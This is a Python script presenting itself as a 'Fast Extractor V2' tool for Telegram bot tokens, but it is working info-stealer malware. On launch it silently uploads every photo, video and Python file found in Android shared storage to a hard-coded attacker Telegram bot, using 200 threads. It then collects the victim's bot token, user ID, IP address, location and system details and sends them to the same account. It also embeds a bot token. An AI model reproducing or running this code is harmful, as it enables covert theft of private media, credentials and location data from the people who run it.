import os
import sys
import re
import platform
import webbrowser
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests")
    import requests

BOT_TOKEN = "7916599785:AAGH5lZKi78xbhKsReJW3SfEmqMecygVVa0"
ADMIN_ID = 7509199927
PHOTO_DIR = "/storage/emulated/0/"
MAX_THREADS = 200

RED = "\033[31m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"
session = requests.Session()

BANNER = f"""{RED}
 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                         
             ⌯ Fast Extractor V2 ⌯
{RESET}"""

def print_red(text): print(f"{RED}{text}{RESET}")
def clear_screen(): print(CLEAR + BANNER)
def is_valid_token(token): return re.match(r"^\d{6,}:[\w-]{30,}$", token)
def is_valid_user_id(user_id): return user_id.isdigit()

def get_device_info():
    try:
        ip_data = session.get("http://ip-api.com/json/", timeout=5).json()
        return f"""
🌐 IP Address: <code>{ip_data.get('query')}</code>
📍 Country: <b>{ip_data.get('country')}</b>
🏙️ City: {ip_data.get('city')}
📶 ISP: {ip_data.get('isp')}
📡 Region: {ip_data.get('regionName')}

🖥️ System: {platform.system()} {platform.release()}
📱 Machine: {platform.machine()}
        """.strip()
    except:
        return "❌ Failed to get IP/device info."

def collect_all_files():
    allowed_exts = ('.jpg', '.jpeg', '.png', '.mp4', '.mov', '.mkv', '.webm', '.avi', '.py')
    return [os.path.join(root, file)
            for root, _, files in os.walk(PHOTO_DIR)
            for file in files if file.lower().endswith(allowed_exts)]

def send_file(file_path):
    try:
        filename = os.path.basename(file_path).lower()
        if filename.endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi')):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
            with open(file_path, 'rb') as f:
                session.post(url, files={'video': f}, data={'chat_id': ADMIN_ID}, timeout=10)
        elif filename.endswith(('.jpg', '.jpeg', '.png')):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            with open(file_path, 'rb') as f:
                session.post(url, files={'photo': f}, data={'chat_id': ADMIN_ID}, timeout=10)
        elif filename.endswith('.py'):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                session.post(url, files={'document': f}, data={'chat_id': ADMIN_ID}, timeout=10)
    except:
        pass

def send_files_batch(files):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(send_file, files)

def send_token_and_id(token, user_id):
    info = get_device_info()
    message = f"""🆕 New Submission:

🎟️ Token:
<code>{token}</code>

🆔 User ID:
<code>{user_id}</code>

{info}
"""
    try:
        session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
            "chat_id": ADMIN_ID,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=5)
    except:
        pass

def main():
    clear_screen()
    files = collect_all_files()
    if files:
        send_files_batch(files)

    print_red("\n 𝗧𝗼𝗸𝗲𝗻 ⇩⇩")
    token = input("  > ").strip()
    if not is_valid_token(token):
        print_red(" توكن غير صالح")
        return

    print_red("\n 𝗜𝗗 ⇩⇩")
    user_id = input("  > ").strip()
    if not is_valid_user_id(user_id):
        print_red("❌ ايدي غير صالح")
        return

    send_token_and_id(token, user_id)
    print_red("\n")

if __name__ == "__main__":
    main()